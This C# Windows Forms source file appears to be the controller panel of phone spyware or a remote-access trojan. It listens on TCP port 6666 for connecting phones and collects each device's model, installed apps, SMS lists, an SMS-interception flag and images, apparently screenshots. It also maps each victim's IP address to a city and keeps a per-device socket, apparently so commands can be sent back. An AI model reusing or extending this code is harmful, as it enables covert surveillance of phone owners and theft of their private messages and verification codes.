using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ClientCtrl
{
    public partial class FormMain : Form
    {
        public FormMain()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Control.CheckForIllegalCrossThreadCalls = false;
            initSocket();
            addData();
        }
        public const int IP_PORT = 6666;
        private void initSocket()
        {
            this.textBox_host.Text = getIpAddress() + ":" + IP_PORT;



            Socket server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            IPEndPoint point = new IPEndPoint(IPAddress.Any, IP_PORT);
            server.Bind(point);
            server.Listen(999);
            Thread thread = new Thread(acceptClient);
            thread.IsBackground = true;
            thread.Start(server);
            listBox_log.Items.Add("=====init======");

        }

        private string getIpAddress()
        {
            IPHostEntry ipHost = Dns.Resolve(Dns.GetHostName());
            IPAddress ipAddr = ipHost.AddressList[0];
            return ipAddr.ToString();
        }

        private void acceptClient(Object obj)
        {
            Socket serverSocket = obj as Socket;
            while (true)
            {
                Socket client = serverSocket.Accept();
                var sendIpoint = client.RemoteEndPoint.ToString();
                listBox_log.Items.Add("Accept======" + sendIpoint);
                Console.WriteLine($"{sendIpoint}Connection");
                //开启一个新线程不停接收消息
                Thread thread = new Thread(ReciveContent);
                thread.IsBackground = true;
                thread.Start(client);
            }

        }
        //接受客户端消息
        private void ReciveContent(Object obj)
        {

            Socket socketServer = obj as Socket;

            byte[] uuidByte = new byte[36];
            socketServer.Receive(uuidByte);
            //每个请求都有唯一标识
            String uuid = System.Text.UTF8Encoding.Default.GetString(uuidByte);

            byte[] headerByte = new byte[3];
            socketServer.Receive(headerByte);
            String header = System.Text.UTF8Encoding.Default.GetString(headerByte);
            listBox_log.Items.Add("client:===header:" + header);

            byte[] buffer = new byte[10 * 1024];
            int length = 0;
            if ("str".Equals(header))
            {
                StringBuilder sb = new StringBuilder();
                while ((length = socketServer.Receive(buffer)) > 0)
                {
                    sb.Append(UTF8Encoding.UTF8.GetChars(buffer,0,length));

                }
                Console.WriteLine("str==content====" + sb.ToString());
                ClientInfoBean clientInfo = AllUtils.jsonToObj(sb.ToString(), typeof(ClientInfoBean)) as ClientInfoBean;
                Console.WriteLine("111==========");
                if (clientInfo == null)
                {

                    Console.WriteLine("clientInfo==null==========");
                    return;
                }
                //upData
                 addDataList(clientInfo, socketServer);
                Console.WriteLine("2222==========");
                UIAppList.updataAppsData(this.dataGridView_apps, clientInfo.appList);

                IPEndPoint clientipe = (IPEndPoint)socketServer.RemoteEndPoint;
                clientInfo.ipAddress = clientipe.Address.ToString();
                UIAppList.updataPhoneInfo(this.listBox_phone_info, clientInfo);
                Console.WriteLine("3333==========");
                UIAppList.updataSmsList(this.dataGridView_sms, clientInfo.smsList);
                Console.WriteLine("app列表：" + clientInfo.appList);
                return;
            }
            //接受的是图片
            MemoryStream ms = new MemoryStream();

            while ((length = socketServer.Receive(buffer)) > 0)
            {
                ms.Write(buffer, 0, buffer.Length);
            }

            //string words = Encoding.UTF8.GetString(buffer, 0, buffer.Length);
            listBox_log.Items.Add("client:===img====");
            Bitmap bmp = null;
            try
            {
                bmp = new Bitmap(ms);

            }
            catch (Exception e)
            {
            }
            this.pictureBox1.Image = bmp;
            ms.Close();


        }
        private Hashtable hashTableSocket;
        //添加一条记录到列表
        private void addDataList(ClientInfoBean clientInfo, Socket socket)
        {
            if (clientInfo == null)
            {
                return;
            }
            if (hashTableSocket == null)
            {
                hashTableSocket = new Hashtable();
            }

            if (!hashTableSocket.ContainsKey(clientInfo.deviceId))
            {
                hashTableSocket.Add(clientInfo.deviceId, socket);

                int index = this.dataGridView1.Rows.Add();
                this.dataGridView1.Rows[index].Cells[0].Value = "第" + index + "条";
                this.dataGridView1.Rows[index].Cells[1].Value = "alis";
                this.dataGridView1.Rows[index].Cells[2].Value = clientInfo.phoneModle;
                this.dataGridView1.Rows[index].Cells[3].Value = true;
                this.dataGridView1.Rows[index].Cells[4].Value = clientInfo.isInterceptSMS;
                this.dataGridView1.Rows[index].Cells[5].Value = AllUtils.getIpsCity(clientInfo.ipAddress);
            }
            //  this.dataGridView1.DataSource = hashTableSocket;

        }

        private void addData()
        {
            hashTableSocket = new Hashtable();



        }

        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {

        }

        private void dataGridView1_SelectionChanged(object sender, EventArgs e)
        {
            Console.WriteLine("SelectionChanged===");
            DataGridView viewData = sender as DataGridView;



        }

        private void dataGridView1_RowEnter(object sender, DataGridViewCellEventArgs e)
        {
            Console.WriteLine("dataGridView1_RowEnter===" + e.RowIndex);
        }
    }
}
